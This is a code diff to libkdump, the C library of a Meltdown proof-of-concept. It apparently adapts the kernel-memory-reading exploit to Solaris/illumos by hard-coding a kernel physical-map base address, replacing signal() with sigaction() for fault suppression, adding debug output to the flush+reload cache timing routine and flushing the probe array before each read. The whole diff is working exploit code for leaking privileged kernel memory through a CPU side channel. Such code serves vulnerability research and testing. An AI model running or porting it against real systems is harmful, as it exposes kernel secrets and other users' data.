@@ -24,6 +24,10 @@ static int dbg = 0;
 
 static libkdump_config_t config;
 
+#define USE_RDTSCP
+
+//#define NO_TSX
+
 #if defined(NO_TSX) && defined(FORCE_TSX)
 #error NO_TSX and FORCE_TSX cannot be used together!
 #endif
@@ -123,7 +127,7 @@ static void flush(void *p) {
 }
 
 // ---------------------------------------------------------------------------
-static int __attribute__((always_inline)) flush_reload(void *ptr) {
+static int __attribute__((always_inline)) flush_reload(void *ptr, size_t addr) {
   uint64_t start = 0, end = 0;
 
   start = rdtsc();
@@ -133,6 +137,7 @@ static int __attribute__((always_inline)) flush_reload(void *ptr) {
   flush(ptr);
 
   if (end - start < config.cache_miss_threshold) {
+	if (dbg) printf("hit at %lx with miss cost %lu, val 0x%x\n", addr, end-start, ((char *)ptr - mem) / 4096);
     return 1;
   }
   return 0;
@@ -269,7 +274,12 @@ static void auto_config() {
   config.load_threads = 1;
   config.load_type = NOP;
   config.retries = 10000;
+/* Hard-coded SEGKPM_BASE */
+#ifdef __sun
+ config.physical_offset = 0xfffffe0000000000ull;
+#else
   config.physical_offset = 0xffff880000000000ull;
+#endif
 }
 
 // ---------------------------------------------------------------------------
@@ -294,6 +304,7 @@ static void unblock_signal(int signum __attribute__((__unused__))) {
 
 // ---------------------------------------------------------------------------
 static void segfault_handler(int signum) {
+//printf("segfault handler \n");
   (void)signum;
   run = 0;
   unblock_signal(SIGSEGV);
@@ -361,7 +372,10 @@ int libkdump_init(const libkdump_config_t configuration) {
   debug(SUCCESS, "Started %d load threads\n", config.load_threads);
 
   if (config.fault_handling == SIGNAL_HANDLER) {
-    if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
+    struct sigaction sa = { 0 };
+    sa.sa_handler = segfault_handler;
+
+    if (sigaction(SIGSEGV, &sa, NULL) != 0) {
       debug(ERROR, "Failed to setup signal handler\n");
       libkdump_cleanup();
       return -1;
@@ -396,19 +410,7 @@ size_t libkdump_phys_to_virt(size_t addr) {
 void libkdump_enable_debug(int enable) { dbg = enable; }
 
 // ---------------------------------------------------------------------------
-static int __attribute__((always_inline)) read_value() {
-  int i, hit = 0;
-  for (i = 0; i < 256; i++) {
-    if (flush_reload(mem + i * 4096)) {
-      hit = i + 1;
-    }
-    sched_yield();
-  }
-  return hit - 1;
-}
-
-// ---------------------------------------------------------------------------
-int __attribute__((optimize("-Os"), noinline)) libkdump_read_tsx() {
+int __attribute__((optimize("-Os"), noinline)) libkdump_read_tsx(size_t addr) {
 #ifndef NO_TSX
   size_t retries = config.retries + 1;
   uint64_t start = 0, end = 0;
@@ -420,21 +422,21 @@ int __attribute__((optimize("-Os"), noinline)) libkdump_read_tsx() {
     }
     int i;
     for (i = 0; i < 256; i++) {
-      if (flush_reload(mem + i * 4096)) {
+      if (flush_reload(mem + i * 4096, addr)) {
         if (i >= 1) {
           return i;
         }
       }
-      sched_yield();
+      //sched_yield();
     }
-    sched_yield();
+    //sched_yield();
   }
 #endif
   return 0;
 }
 
 // ---------------------------------------------------------------------------
-int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler() {
+int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler(size_t addr) {
   size_t retries = config.retries + 1;
   uint64_t start = 0, end = 0;
 
@@ -447,14 +449,14 @@ int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler() {
 
     int i;
     for (i = 0; i < 256; i++) {
-      if (flush_reload(mem + i * 4096)) {
+      if (flush_reload(mem + i * 4096, addr)) {
         if (i >= 1) {
           return i;
         }
       }
-      sched_yield();
+      //sched_yield();
     }
-    sched_yield();
+   // sched_yield();
   }
   return 0;
 }
@@ -467,14 +469,18 @@ int __attribute__((optimize("-O0"))) libkdump_read(size_t addr) {
   int i, j, r;
   for (i = 0; i < 256; i++)
     res_stat[i] = 0;
+  // jlevon: don't we need this in the general case??
+  for (j = 0; j < 256; j++) {
+    flush(mem + j * 4096);
+  }
 
   sched_yield();
 
   for (i = 0; i < config.measurements; i++) {
     if (config.fault_handling == TSX) {
-      r = libkdump_read_tsx();
+      r = libkdump_read_tsx(addr);
     } else {
-      r = libkdump_read_signal_handler();
+      r = libkdump_read_signal_handler(addr);
     }
     res_stat[r]++;
   }
